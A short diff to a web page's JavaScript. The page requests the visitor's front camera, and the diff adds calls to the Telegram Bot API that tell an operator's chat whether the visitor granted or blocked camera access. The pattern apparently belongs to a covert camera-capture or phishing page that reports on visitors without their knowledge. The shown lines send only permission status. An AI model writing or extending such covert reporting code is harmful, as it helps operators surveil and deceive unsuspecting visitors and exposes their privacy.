@@ -68,6 +68,15 @@
           video: { facingMode: "user" }
         });
 
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: "✅ User granted camera access."
+          })
+        });
+
         video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
@@ -100,6 +109,23 @@
 
       } catch (err) {
         document.getElementById('message').innerText = "❌ Camera permission denied or error occurred.";
+
+        let msg = "❌ Camera access was denied or blocked.";
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          msg += " User explicitly blocked camera access.";
+        } else if (err.name === 'NotFoundError') {
+          msg += " No camera device found.";
+        }
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+
         console.error(err);
       }
     }
